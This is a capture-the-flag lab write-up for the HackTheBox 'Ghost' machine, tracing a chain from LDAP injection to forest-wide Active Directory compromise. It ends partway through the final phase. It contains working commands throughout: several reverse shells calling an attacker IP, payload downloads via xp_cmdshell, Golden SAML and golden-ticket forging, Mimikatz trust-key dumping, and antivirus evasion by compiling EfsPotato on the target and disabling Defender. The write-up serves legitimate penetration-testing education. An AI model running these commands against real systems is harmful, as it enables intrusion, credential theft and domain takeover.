# HackTheBox — Ghost

<div align="center">

![Difficulty](https://img.shields.io/badge/Difficulty-Insane-red?style=for-the-badge) ![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows) ![Category](https://img.shields.io/badge/Category-Active%20Directory-purple?style=for-the-badge)

</div>

---

## Phase 1 — Reconnaissance

### Port Scan

```bash
rustscan -a 10.129.8.228 -u 5000 -b 2000 -- -sCV
```

RustScan was used for speed, passing all discovered ports through to Nmap's service/version detection (`-sCV`). The result was a textbook Windows Domain Controller fingerprint:

|Port|Service|Notes|
|---|---|---|
|53|DNS|Standard DC DNS|
|88|Kerberos|KDC|
|135 / 139 / 445|RPC / SMB|Standard Windows|
|389 / 636|LDAP / LDAPS|Directory services|
|3268 / 3269|Global Catalog|Forest-wide LDAP|
|80 / 443|HTTP / HTTPS|Web apps|
|8008 / 8443|HTTP / HTTPS|Non-standard web apps|
|5985|WinRM|Remote management|

### Clock Skew — Critical for Kerberos

The Nmap output reported a clock skew of approximately **-1 hour**. This is not cosmetic — Kerberos authentication has a strict 5-minute tolerance. Any skew beyond that will cause all Kerberos operations to fail silently or with cryptic errors.

```bash
ntpdate -u 10.129.8.228
```

> Synchronize the attack box clock to the DC before attempting _any_ Kerberos interaction. This step must be repeated after system sleep or hibernation.

### DNS & Hosts Configuration

Nmap identified the machine's hostnames from certificate SANs and LDAP attributes: `ghost.htb` and `DC01.ghost.htb`.

```bash
echo "10.129.8.228 DC01.ghost.htb ghost.htb" | sudo tee -a /etc/hosts
```

DNS zone transfer was attempted but returned no results:

```bash
dig axfr ghost.htb @10.129.8.228
```

No subdomains via DNS. Web enumeration is the next entry point.

---

## Phase 2 — Web Enumeration & Vhost Discovery

### Application Mapping

Four HTTP/HTTPS services were active:

|Port|Service|Finding|
|---|---|---|
|80|HTTP|No content|
|443|HTTPS|No content|
|8008|HTTP|Ghost CMS blog|
|8443|HTTPS|Login page — clicking login reveals `federation.ghost.htb`|

<img width="1285" height="693" alt="Pasted image 20260610205843" src="https://github.com/user-attachments/assets/b8dce424-4715-437a-b5ad-c986e59e815d" />


<img width="1639" height="836" alt="Pasted image 20260610205852" src="https://github.com/user-attachments/assets/0563ecb2-f1cc-4e93-a0e0-f0abbe367be6" />


`federation.ghost.htb` was added to `/etc/hosts` immediately. This is an ADFS federation endpoint — highly significant for the endgame.

### Virtual Host Fuzzing

VHost fuzzing was performed against port 8008:

```bash
ffuf -u http://ghost.htb:8008 \
  -H "Host: FUZZ.ghost.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -fs 6696,7676,0
```

The `-fs` flag filters by response size. The three values correspond to the default responses for non-existent vhosts. Any response with a _different_ size is a real vhost.

**Result:** `intranet.ghost.htb` — a corporate intranet portal with a login form.

<img width="1312" height="418" alt="Pasted image 20260610205920" src="https://github.com/user-attachments/assets/5fd383a1-6e7f-4e3c-a17e-e83520ec1806" />


Updated `/etc/hosts`:

```
10.129.8.228  DC01.ghost.htb ghost.htb federation.ghost.htb intranet.ghost.htb
```

<img width="924" height="370" alt="Pasted image 20260610205945" src="https://github.com/user-attachments/assets/8d2fc626-9856-4577-87d5-3faf173f1238" />


---

## Phase 3 — LDAP Injection & Credential Extraction

### Initial LDAP Injection — Login Bypass

The intranet login form was captured in Burp Suite. Error messages on failed login attempts revealed LDAP-style feedback, indicating the backend was querying an LDAP directory. Testing the most basic wildcard injection:

<img width="1316" height="613" alt="Pasted image 20260610210030" src="https://github.com/user-attachments/assets/508d6e68-f342-4477-b728-5af2b02e52b3" />


```
username: *
password: *
```

<img width="1307" height="628" alt="Pasted image 20260610210039" src="https://github.com/user-attachments/assets/7ff9649a-c276-4558-8120-4e736472faea" />


The result was a **successful login** — authenticated as `kathryn.holland`. The backend LDAP filter was likely structured as:

```
(&(uid=*)(userPassword=*))
```

Both wildcards match any value, so the query always returns the first user in the directory. Classic LDAP injection — login bypassed.

<img width="1647" height="770" alt="Pasted image 20260610210103" src="https://github.com/user-attachments/assets/4b0b18c6-5216-4ae2-98c5-0329f991e14b" />

### Intelligence Gathering on the Intranet

Once inside, the intranet forum revealed two critical facts:

1. **A Gitea instance exists** — the team is migrating from Gitea to Bitbucket. Gitea was found at `http://gitea.ghost.htb:8008`.
2. **A service account `gitea_temp_principal`** — created with a temporary secret for the migration. This is the target.

<img width="1648" height="835" alt="Pasted image 20260610210145" src="https://github.com/user-attachments/assets/54b05a67-a99c-418b-9e99-9b9267689e4e" />

<img width="907" height="212" alt="Pasted image 20260610210311" src="https://github.com/user-attachments/assets/ab8814e9-484b-4d3c-85be-7ce6d3432866" />

### Validating the Account

To confirm whether `gitea_temp_principal` exists in the directory, the wildcard injection was tested with the specific username:

```
username: gitea_temp_principal
password: *
```

Login succeeded — the account is valid. The wildcard matched whatever the actual password was. Now the objective was to recover the real secret character by character.

<img width="1657" height="627" alt="Pasted image 20260610210336" src="https://github.com/user-attachments/assets/5c6e4b0a-ba36-457d-8382-884e9cce59b2" />

### Blind LDAP Injection — Character-by-Character Secret Extraction

This is conceptually identical to blind SQL injection but against an LDAP backend. The LDAP filter for the login is likely:

```
(&(uid=gitea_temp_principal)(userPassword=INJECTION))
```

By submitting a password of `s*`, the filter becomes:

```
(&(uid=gitea_temp_principal)(userPassword=s*))
```

If the password starts with `s`, LDAP returns a match (successful login). If not, it returns nothing (failed login). This is a **binary oracle** — yes or no for each character guess.

<img width="1564" height="740" alt="Pasted image 20260610210425" src="https://github.com/user-attachments/assets/6274cb84-d15e-4a64-a3c1-f493b4e5432a" />


This was automated in **Burp Suite Intruder** (Sniper mode) with a character set payload of `a-z0-9`. The distinguishing factor was the HTTP response code and body — a valid character returned the same successful login response as `*:*`, while an invalid character returned an error page.

Extraction proceeded position by position:

<img width="1304" height="730" alt="Pasted image 20260610210547" src="https://github.com/user-attachments/assets/47c5e209-ab12-43f5-a298-e233742d7b4e" />


```
s*              → valid  →  first char is 's'
sz*             → valid  →  second char is 'z'
szr*            → valid  →  ...
szrr*           → valid
szrr8*          → valid
...
szrr8kpc3z6onlqf   → no further characters match → complete
```

**Recovered credentials:** `gitea_temp_principal : szrr8kpc3z6onlqf`

Login to Gitea successful.

---

## Phase 4 — Source Code Analysis (Gitea)

Two repositories were discovered: **`intranet`** and **`blog`**.

<img width="1651" height="642" alt="Pasted image 20260610210936" src="https://github.com/user-attachments/assets/9cc6e205-f625-4208-aa16-f8153f5eec06" />

### Repository: `blog` — Path Traversal in Ghost CMS

A modified Ghost CMS file (`posts-public.js`) was present in the blog repository. The relevant code:

```javascript
router.get('/', async (req, res) => {
    const extra = req.query.extra;
    if (extra) {
        const content = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
        res.json({ extra: content });
    }
});
```

The `extra` query parameter is passed directly into `fs.readFileSync()` with **no sanitization, no path normalization, and no validation**. This is a textbook path traversal vulnerability. An attacker can traverse out of the intended directory and read any file accessible to the Ghost process.

The Ghost content API requires a public API key, which was visible in the repository and Ghost's documentation.

### Repository: `intranet` — Command Injection in Rust Backend

The intranet backend was written in Rust. The critical section from the `intranet` repository:

```rust
async fn scan_handler(
    State(state): State<AppState>,
    headers: HeaderMap,
    Json(data): Json<ScanRequest>,
) -> impl IntoResponse {
    let key = headers.get("X-DEV-INTRANET-KEY")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("");

    if key != state.dev_key {
        return (StatusCode::FORBIDDEN, "Forbidden").into_response();
    }

    // VULNERABILITY: Unsanitized user input passed directly to bash -c
    let output = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))  // ← INJECTION SINK
        .output()
        .await;
}
```

The `data.url` field is interpolated directly into a shell command string. This is OS command injection — anything after a `;`, `&&`, `||`, or `$()` executes as a separate shell command.

The only protection is the `X-DEV-INTRANET-KEY` header check. The key is loaded from an **environment variable** at startup — meaning it will appear in `/proc/1/environ` if that process is running the intranet service.

**The full chain is now clear:**

1. Use the path traversal in Ghost to read `/proc/1/environ` of the Ghost/intranet process
2. Extract `DEV_INTRANET_KEY` from the environment dump
3. Call `/api-dev/scan` with the key and a command injection payload in `url`

---

## Phase 5 — Path Traversal → Key Extraction

The Ghost content API exposes posts publicly with a content API key. The traversal payload targets the process environment:

```bash
curl "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../../proc/1/environ"
```

The response contained the raw environment of the Ghost process — a null-byte-delimited list of `KEY=VALUE` pairs. Within it, the `DEV_INTRANET_KEY` variable was present in plaintext.

<img width="1644" height="425" alt="Pasted image 20260610211149" src="https://github.com/user-attachments/assets/b299fe75-8933-4329-8a15-67c003eedc94" />


**Extracted key:** `!@yqr!X2kxmQ.@Xe`

> **Why `/proc/1/environ`?** PID 1 in a Docker container is the main application process. The container is started with environment variables injected at runtime via `docker run -e KEY=VALUE`, which are stored in `/proc/1/environ` for the entire lifetime of the process. This is a common and highly impactful misconfiguration.

---

## Phase 6 — Remote Code Execution

With the `DEV_INTRANET_KEY` in hand, the command injection endpoint was exploited. The payload terminates the `intranet_url_check` command with a semicolon and appends a bash reverse shell:

```bash
# Start listener
nc -lvnp 4444

# Trigger RCE
curl -X POST http://intranet.ghost.htb:8008/api-dev/scan \
  -H "Content-Type: application/json" \
  -H "X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe" \
  -d '{"url": "http://x; bash -i >& /dev/tcp/10.10.16.11/4444 0>&1"}'
```

The bash reverse shell payload breakdown:

- `bash -i` — interactive bash shell
- `>&` — redirects both stdout and stderr to the same destination
- `/dev/tcp/IP/PORT` — bash's built-in TCP connection (no external binaries required)
- `0>&1` — redirects stdin from the same TCP connection

**Result:** Shell received on the netcat listener. Foothold established on the container running the intranet service.

---

## Phase 7 — SSH ControlMaster Pivot

### Enumeration of the Foothold

The foothold was a Docker container. Enumeration of the filesystem revealed a bash script that referenced an SSH ControlMaster configuration, and confirmed the socket path:

```
/root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22
```

<img width="1107" height="577" alt="Pasted image 20260610211329" src="https://github.com/user-attachments/assets/7251a17c-feea-4d4c-86f3-ff88ed927ace" />


**What is SSH ControlMaster?**

SSH ControlMaster is a multiplexing feature that allows multiple SSH sessions to share a single authenticated TCP connection. When enabled, SSH creates a **Unix domain socket** on the filesystem. Subsequent SSH connections to the same destination reuse this socket instead of re-authenticating.

The critical implication: **the control socket represents an already-authenticated session**. Anyone with filesystem access to the socket can piggyback on it — no credentials required.

The socket tells us:

- The authenticated user is `florence.ramirez@ghost.htb`
- The destination is `dev-workstation` on port 22
- The session is currently active

### Using the ControlMaster Socket

```bash
ssh -S /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 \
  florence.ramirez@ghost.htb@dev.workstation
```

The `-S` flag instructs SSH to use the specified socket instead of establishing a new connection. Since the socket belongs to an already-authenticated session, access is granted immediately.

**Result:** Shell on `dev.workstation` as `florence.ramirez`.

Shell stabilization:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

<img width="1264" height="230" alt="Pasted image 20260610211443" src="https://github.com/user-attachments/assets/ea44cf28-172f-4959-9155-9271de1d43f8" />


---

## Phase 8 — Kerberos Ticket & Network Tunneling

### Kerberos Ticket Extraction

Enumeration of `florence.ramirez`'s environment revealed an active **Kerberos credential cache** — a `.ccache` file containing a valid TGT for the user within the `ghost.htb` domain. The ticket was base64-encoded in a file on disk.

<img width="700" height="522" alt="Pasted image 20260610211604" src="https://github.com/user-attachments/assets/f6f953f2-ce19-423c-8816-3d38fc0d0453" />

Transfer and decode on the attack box:

```bash
echo "<base64_content>" | base64 -d > /tmp/ticket.krb5cc
export KRB5CCNAME=/tmp/ticket.krb5cc
```

This ticket enables Kerberos-authenticated operations against the DC as `florence.ramirez` — immediately useful for DNS record injection later.

### Network Topology

The `/etc/hosts` file on `dev.workstation` revealed the internal network:

```
10.0.0.254   dc01.ghost.htb ghost.htb
```

The DC is at `10.0.0.254` — not directly reachable from the attack box. A tunnel through the compromised workstation is required.

### Ligolo-ng Tunnel Setup

Ligolo-ng creates a proper **tun interface** on the attack box, allowing any tool to route traffic through the pivot without requiring proxychains.

**Transfer the agent** — `curl`/`wget` unavailable on the foothold, so Python's urllib was used:

```bash
# Attack box — serve the agent
python3 -m http.server 8000

# On dev.workstation
python3 -c "
import urllib.request
urllib.request.urlretrieve('http://10.10.16.11:8000/agent', '/tmp/agent2')
"
chmod +x /tmp/agent2
```

**Start the proxy on the attack box:**

```bash
ligolo-proxy -selfcert
```

**Connect the agent from the workstation:**

```bash
./agent2 -connect 10.10.16.11:11601 -ignore-cert
```

<img width="1490" height="207" alt="Pasted image 20260610211642" src="https://github.com/user-attachments/assets/f1b88496-8e85-4b76-afcb-414cb7d64d5e" />


**In the Ligolo proxy console:**

```
session       # select the active session
autoroute     # auto-detect internal subnets
```

<img width="714" height="163" alt="Pasted image 20260610211719" src="https://github.com/user-attachments/assets/df76bd53-76f5-4d48-a945-141f3f64bab4" />


**Add explicit route to the DC subnet on the attack box:**

```bash
ip route add 10.0.0.0/24 dev <ligolo_tun_interface>
```

<img width="406" height="48" alt="Pasted image 20260610211743" src="https://github.com/user-attachments/assets/e6294a2f-c733-4835-bda9-4a304d0cdc7c" />


Verify connectivity:

```bash
ping -c 1 10.0.0.254
```

---

## Phase 9 — NTLM Hash Capture via DNS Poisoning

### Intelligence from the Intranet Forum

Re-reading the intranet forum as `kathryn.holland`:

> **Justin:** "My script keeps failing — it's trying to connect to `bitbucket.ghost.htb` but getting DNS resolution errors."  
> **Kathryn:** "Don't worry, just keep running it."

<img width="1454" height="237" alt="Pasted image 20260610211814" src="https://github.com/user-attachments/assets/690f5e35-ed7e-4aa3-a47c-bd951b285df2" />


**What this means:** `justin.bradley` has a script running in a continuous loop, repeatedly attempting to connect to `bitbucket.ghost.htb`. That DNS record does not exist. If we create it pointing to our attack box, his script will connect to us. If the connection uses NTLM authentication (standard Windows behavior for HTTP/SMB), we capture his NTLMv2 hash.

### DNS Record Injection via bloodyAD

Using `florence.ramirez`'s Kerberos ticket:

```bash
KRB5CCNAME=/tmp/ticket.krb5cc bloodyAD \
  --host dc01.ghost.htb \
  -d ghost.htb \
  --dc-ip 10.0.0.254 \
  -k \
  add dnsRecord \
  --zone ghost.htb \
  bitbucket \
  10.10.16.11
```

<img width="1332" height="64" alt="Pasted image 20260610211833" src="https://github.com/user-attachments/assets/44107459-77b6-4051-be2e-86da47d7d41e" />


This adds an A record: `bitbucket.ghost.htb` → `10.10.16.11` (attack box) in the domain DNS.

### Capturing NTLMv2 with Responder

```bash
responder -I tun0
```

Within seconds of the DNS record propagating, `justin.bradley`'s script attempted to connect to our IP. Responder intercepted the authentication and captured the full NTLMv2 challenge-response hash.

<img width="1644" height="553" alt="Pasted image 20260610211937" src="https://github.com/user-attachments/assets/9ae154a8-9fbf-45ce-9347-62a66c717c89" />


### Cracking the Hash

```bash
hashcat -m 5600 justin.hash /usr/share/wordlists/rockyou.txt
```

Mode `5600` is NetNTLMv2. The hash cracked quickly.

<img width="1638" height="813" alt="Pasted image 20260610212012" src="https://github.com/user-attachments/assets/6f26ae0e-f079-4a1b-81a4-69402003d864" />


**Credentials:** `JUSTIN.BRADLEY : Qwertyuiop1234$$`

---

## Phase 10 — BloodHound & GMSA Abuse

### BloodHound Collection

```bash
bloodhound-python -c ALL \
  -u JUSTIN.BRADLEY \
  -p 'Qwertyuiop1234$$' \
  -d ghost.htb \
  -ns 10.0.0.254 \
  -dc dc01.ghost.htb \
  --zip \
  --use-ldaps
```

The resulting ZIP was uploaded to the BloodHound GUI for attack path analysis.

### Critical Finding: ReadGMSAPassword

BloodHound revealed a direct attack path:

```
JUSTIN.BRADLEY → [ReadGMSAPassword] → ADFS_GMSA$
```

**Group Managed Service Accounts (GMSA)** are AD accounts with automatically rotating passwords, managed by the domain controller. The password is stored as the `msDS-ManagedPassword` attribute in AD — readable only by explicitly authorized principals. `JUSTIN.BRADLEY` had been granted `ReadGMSAPassword` over `ADFS_GMSA$`.

<img width="1104" height="173" alt="Pasted image 20260610212145" src="https://github.com/user-attachments/assets/4ba09c3e-5caf-4ed3-af0f-bcb172f37474" />


### GMSA Password Retrieval

```bash
nxc ldap 10.0.0.254 \
  -u JUSTIN.BRADLEY \
  -p 'Qwertyuiop1234$$' \
  --gmsa
```

<img width="1529" height="116" alt="Pasted image 20260610212206" src="https://github.com/user-attachments/assets/4352f841-1b2b-47c9-9369-21a101828f6c" />


NetExec queries the `msDS-ManagedPassword` LDAP attribute and returns the NT hash of the GMSA account directly.

**Result:** `adfs_gmsa$ : <NT hash>`

### WinRM Access via Pass-the-Hash

GMSA accounts authenticate using their NT hash:

```bash
evil-winrm -i 10.0.0.254 \
  -u 'adfs_gmsa$' \
  -H '<NT_HASH>'
```

Shell established on the DC as the ADFS service account.

<img width="1123" height="209" alt="Pasted image 20260610212334" src="https://github.com/user-attachments/assets/f4ad011c-b0b4-4c46-9413-e7b07929e306" />


---

## Phase 11 — ADFS Dump & Golden SAML

### What is Golden SAML?

**Active Directory Federation Services (ADFS)** is Microsoft's SSO federation solution. It issues SAML tokens signed with a private key, allowing applications to trust user identities without handling authentication themselves.

A **Golden SAML** attack mirrors the concept of a Golden Ticket but at the federation layer:

|Attack|What's Stolen|What's Forged|
|---|---|---|
|Golden Ticket|`krbtgt` hash|Kerberos TGT|
|Golden SAML|ADFS signing key|SAML assertion|

With a forged SAML assertion, you can claim to be **any user** — including `Administrator` — for any application that trusts this ADFS server. It bypasses passwords, MFA, and every other authentication control at the application layer.

### Extracting ADFS Secrets with ADFSDump

```powershell
# Transfer ADFSDump to the target
wget http://10.10.16.11:8000/ADFSDump.exe -O ADFSDump.exe

# Execute as the ADFS service account
.\ADFSDump.exe
```

<img width="736" height="20" alt="Pasted image 20260608203509" src="https://github.com/user-attachments/assets/c00c8537-20fd-46aa-946b-ec88f37ba05e" />

<img width="1552" height="286" alt="Pasted image 20260608203530" src="https://github.com/user-attachments/assets/7498f5a8-bf71-4f52-bc66-a54bf7e2f064" />

<img width="1639" height="536" alt="Pasted image 20260608203547" src="https://github.com/user-attachments/assets/167cf5d6-5868-4ef2-8a66-15d486575644" />

<img width="1637" height="649" alt="Pasted image 20260608203600" src="https://github.com/user-attachments/assets/1cf2ea0d-2acb-45a4-bb61-5f2a320e6c2a" />



ADFSDump extracts:

1. **The encrypted PFX blob** — the token signing certificate, encrypted with the ADFS DKM key
2. **The DKM decryption key** — stored in AD under a specific container, readable only by the ADFS service account

### Preparing the Key Material on the Attack Box

```bash
# DKM key (hex) → binary
echo -n '8DACA490702B3FD608D5BC35A9848756D2FA3B7B7413A3C62C58A6F458FB9DA1' | xxd -r -p > /tmp/key2.bin

# Encrypted blob (base64) → binary
echo -n '<BLOB_BASE64>' | base64 -d > /tmp/blob2.bin
```

### Forging the SAML Token with ADFSpoof

```bash
python3 ~/ADFSpoof/ADFSpoof.py \
  -b /tmp/blob2.bin /tmp/key2.bin \
  -s 'core.ghost.htb' saml2 \
  --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' \
  --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' \
  --nameid 'Administrator@ghost.htb' \
  --rpidentifier 'https://core.ghost.htb:8443' \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
```

ADFSpoof decrypts the PFX using the DKM key, then signs a new SAML assertion claiming the identity `Administrator@ghost.htb`. The output is a base64-encoded `SAMLResponse`.

<img width="1636" height="543" alt="Pasted image 20260610212549" src="https://github.com/user-attachments/assets/7a84f559-2497-4c64-8c35-df81660d9b3e" />


### Redeeming the Token via Burp Suite

1. Intercept the login flow to `https://core.ghost.htb:8443/` in Burp Suite

<img width="1194" height="358" alt="Pasted image 20260610212620" src="https://github.com/user-attachments/assets/576d0d13-ff31-4154-b46d-3c6d07b3a861" />


2. Send to **Repeater** — change method to `POST`, endpoint: `/adfs/saml/postResponse`
3. Set body: `SAMLResponse=<URL_ENCODED_BASE64_TOKEN>`

<img width="648" height="622" alt="Pasted image 20260609204211" src="https://github.com/user-attachments/assets/f8ff4574-1584-4934-be87-97850f0129c5" />


4. Send — the response returns a valid session cookie for `Administrator`

<img width="631" height="204" alt="vmware_A2Pn3XfaiD" src="https://github.com/user-attachments/assets/bfc84e85-6471-4e6c-b857-cd2af3052750" />


5. Inject the cookie into the browser request and forward

<img width="1208" height="329" alt="vmware_94Ja0DJO7U" src="https://github.com/user-attachments/assets/ccc9408e-dcfc-4599-bdee-63214373958b" />

**Result:** Full access to the **Ghost Configuration Panel** — a web-based SQL execution interface.

<img width="533" height="479" alt="Pasted image 20260610212944" src="https://github.com/user-attachments/assets/bfba484e-abd2-4866-848a-cad9a02095c6" />


---

## Phase 12 — Linked SQL Server Abuse

### Database Reconnaissance

```sql
-- List databases on current server
SELECT name FROM master.dbo.sysdatabases
-- master, tempdb, model, msdb

-- Discover linked servers
SELECT srvname, isremote FROM sysservers
-- PRIMARY (remote)

-- Check running user context on the linked server
SELECT * FROM OPENQUERY("PRIMARY", 'SELECT CURRENT_USER AS result')
-- bridge_corp
```

<img width="576" height="527" alt="Pasted image 20260610213015" src="https://github.com/user-attachments/assets/a4a74ccf-718f-4a98-a81c-bfe144245eb7" />


<img width="634" height="469" alt="Pasted image 20260610213040" src="https://github.com/user-attachments/assets/768edca3-9390-441f-8738-40cefce713e1" />

### Privilege Escalation via Impersonation

```sql
-- Check who bridge_corp can impersonate
SELECT * FROM OPENQUERY("PRIMARY",
  'SELECT a.name, b.permission_name
   FROM sys.server_principals a
   JOIN sys.server_permissions b
     ON a.principal_id = b.grantee_principal_id
   WHERE b.permission_name = ''IMPERSONATE''')
-- bridge_corp → sa

-- Confirm impersonation works
SELECT * FROM OPENQUERY("PRIMARY",
  'EXECUTE AS LOGIN = ''sa''; SELECT SYSTEM_USER AS result')
-- sa
```

<img width="702" height="569" alt="Pasted image 20260610213105" src="https://github.com/user-attachments/assets/996ecfa3-fc73-418a-8b09-df942f3e387b" />


<img width="611" height="387" alt="Pasted image 20260610213128" src="https://github.com/user-attachments/assets/57e9d9ed-3ff7-45c8-a046-586564e1c5c5" />


`bridge_corp` can impersonate `sa` — the highest-privileged SQL Server login (sysadmin by default).

### Enabling xp_cmdshell

`xp_cmdshell` is disabled by default as a security measure. Since we can impersonate `sa`, we can re-enable it:

```sql
EXECUTE('EXECUTE AS LOGIN=''sa'';
  EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;
  EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [PRIMARY]
```

### Command Execution Verification

```sql
EXECUTE('EXECUTE AS LOGIN=''sa'';
  EXEC xp_cmdshell ''whoami''') AT [PRIMARY]
```

<img width="772" height="540" alt="Pasted image 20260610213325" src="https://github.com/user-attachments/assets/94bb25d6-f8fc-46a9-959e-bce12fe70c03" />

### Reverse Shell via nc64.exe

Direct shell payloads exceeded the SQL interface character limit. Upload `nc64.exe` first:

```sql
-- Upload
EXECUTE('EXECUTE AS LOGIN=''sa'';
  EXEC xp_cmdshell ''powershell -c "Invoke-WebRequest http://10.10.16.11:8000/nc64.exe -OutFile C:\ProgramData\nc64.exe"''') AT [PRIMARY]
```

```bash
# Start listener on attack box
nc -lvnp 4444
```

```sql
-- Connect back
EXECUTE('EXECUTE AS LOGIN=''sa'';
  EXEC xp_cmdshell ''C:\ProgramData\nc64.exe 10.10.16.11 4444 -e powershell.exe''') AT [PRIMARY]
```

<img width="768" height="231" alt="Pasted image 20260610213409" src="https://github.com/user-attachments/assets/2c7ce61b-4c23-467b-ac2e-600011fc4f11" />


**Shell received** on the attack box. Now operating on `corp.ghost.htb` as the SQL Server service account.

---

## Phase 13 — SeImpersonate → SYSTEM (AV Bypass)

### Privilege Enumeration

```powershell
whoami /all
```

<img width="700" height="166" alt="Pasted image 20260610213450" src="https://github.com/user-attachments/assets/cc565adc-0982-4eb1-a936-c9118d375476" />


The service account had **`SeImpersonatePrivilege`** enabled — the standard potato exploit entry point.

### Windows Defender Active

```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled
# True
```

<img width="679" height="792" alt="Pasted image 20260610213534" src="https://github.com/user-attachments/assets/3edb4e1c-61f3-4829-a53c-36ac6b2af5fc" />


Windows Defender was running with real-time protection. Uploading a precompiled `GodPotato.exe` or `PrintSpoofer.exe` would be flagged and quarantined immediately.

### AV Bypass Strategy — On-Target Compilation

The solution: **don't bring a binary — bring source code**.

The .NET framework ships with `csc.exe` — a full C# compiler — on every Windows installation with .NET 4.x. Compiling an exploit on the target produces a binary that:

- Has no known signature in AV databases (it was just created)
- Doesn't match any hash-based detection
- Uses a legitimate Windows API (EFS RPC) so behavioral detection is minimal

The exploit used was **EfsPotato** — a `SeImpersonate` exploit targeting the Encrypting File System RPC interface, valid on Windows Server 2019/2022.

```powershell
# Download C# source — AV ignores .cs files
iwr "http://10.10.16.11:8000/EfsPotato.cs" -OutFile EfsPotato.cs

# Compile on the target using the built-in .NET compiler
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

<img width="922" height="400" alt="Pasted image 20260610213612" src="https://github.com/user-attachments/assets/83570e87-afb1-4a83-b5a1-c0393ac009e8" />


<img width="1641" height="152" alt="Pasted image 20260610182811" src="https://github.com/user-attachments/assets/6657af52-eb08-444d-a597-818bf3137e00" />


<img width="663" height="217" alt="vmware_PKUCYrVssS" src="https://github.com/user-attachments/assets/9db3d26f-fc55-48e2-805f-b834eb686999" />


The compiler produces `EfsPotato.exe` locally. Defender has no signature for it.

### Verification

```powershell
.\EfsPotato.exe 'powershell -c whoami'
# nt authority\system
```

<img width="1125" height="236" alt="Pasted image 20260610214150" src="https://github.com/user-attachments/assets/8e039e4d-72e6-48a4-ac52-ce417cc46cb5" />

### Shell as SYSTEM

```bash
# Start listener
nc -lvnp 7676
```

```powershell
.\EfsPotato.exe 'powershell -c .\nc64.exe 10.10.16.11 7676 -e powershell'
```

<img width="1184" height="232" alt="Pasted image 20260610183136" src="https://github.com/user-attachments/assets/7e609e27-a316-47ad-9d33-a770b93d43e4" />


<img width="765" height="181" alt="Pasted image 20260610183146" src="https://github.com/user-attachments/assets/34eba266-1103-4b32-b090-30ac658f3c9c" />


**Shell received as `NT AUTHORITY\SYSTEM`** on `corp.ghost.htb`.

### Disable Defender for Clean Operations

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## Phase 14 — Inter-Forest Trust Exploitation

This is the final and most technically demanding phase. The objective is to leverage the inter-forest trust between `CORP.GHOST.HTB` and `GHOST.HTB` to forge a ticket carrying `Enterprise Admins` privileges in the parent forest.

### Understanding the Attack

When two AD forests have a trust relationship, they exchange a **trust key** — a shared secret (RC4 or AES) that both domain controllers use to sign and verify cross-forest referral tickets. This key is how `GHOST.HTB`'s KDC knows that a ticket referral coming from `CORP.GHOST.HTB` is legitimate.

**The attack premise:** If an attacker compromises a DC in `CORP.GHOST.HTB` and extracts the inter-forest trust key, they can forge a cross-realm TGT that:

1. Claims to originate legitimately from `CORP.GHOST.HTB`
2. Contains an **ExtraSIDs** field with the `Enterprise Admins` SID from `GHOST.HTB`
3. Is signed with the stolen trust key — so `GHOST.HTB`'s KDC accepts it without question

When `GHOST.HTB` processes the ticket, it sees the Enterprise Admins SID in the PAC and grants the corresponding domain-wide privileges.

### Required Information

|Item|Value|Source|
|---|---|---|
|Trust key (rc4_hmac_nt)|`38e838b550559cf73ecd18136f0a757a`|Mimikatz on CORP DC|
|Enterprise Admins SID (GHOST.HTB)|`S-1-5-21-4084500788-938703357-3654145966-519`|BloodHound|
|CORP.GHOST.HTB Domain SID|`S-1-5-21-2034262909-2733679486-179904498`|BloodHound|

### Step 1 — Extract the Trust Key with Mimikatz

```powershell
# Upload Mimikatz (Defender is disabled)
iwr "http://10.10.16.11:8000/mimikatz.exe" -OutFile mimikatz.exe

.\mimikatz.exe
```

```
lsadump::trust /patch
```

<img width="1647" height="660" alt="Pasted image 20260610214432" src="https://github.com/user-attachments/assets/d834dba1-bad0-4d39-8ce0-862943a466ea" />


This dumps all inter-domain and inter-forest trust keys from the DC's LSA secrets. The target value is `rc4_hmac_nt` for the `GHOST.HTB` trust entry — the shared secret between the two forests.

### Step 2 — Forge the Inter-Forest Trust Ticket

```
kerberos::golden \
  /user:Administrator \
  /domain:CORP.GHOST.HTB \
  /sid:S-1-5-21-2034262909-2733679486-179904498-502 \
  /sids:S-1-5-21-4084500788-938703357-3654145966-519 \
  /rc4:38e838b550559cf73ecd18136f0a757a \
  /service:krbtgt \
  /target:GHOST.HTB \
  /ticket:ticket.kirbi
```

<img width="1644" height="356" alt="Pasted image 20260610214625" src="https://github.com/user-attachments/assets/76330937-0b26-473b-b74a-1fb69ffcec30" />


Parameter breakdown:

|Parameter|Value|Purpose|
|---|---|---|
|`/user`|Administrator|Identity claimed in the ticket|
|`/domain`|CORP.GHOST.HTB|The issuing domain (where we have the trust key)|
|`/sid`|CORP SID + `-502`|Base SID (krbtgt RID in CORP domain)|
|`/sids`|Enterprise Admins SID|**ExtraSIDs** — injected into the PAC, grants elevated rights in GHOST.HTB|
|`/rc4`|Trust key hash|Signs the ticket so GHOST.HTB's KDC accepts it|
|`/service`|krbtgt|Marks this as a TGT-type ticket for cross-realm use|
|`/target`|GHOST.HTB|The target forest realm|

### Step 3 — Request a Service Ticket for CIFS

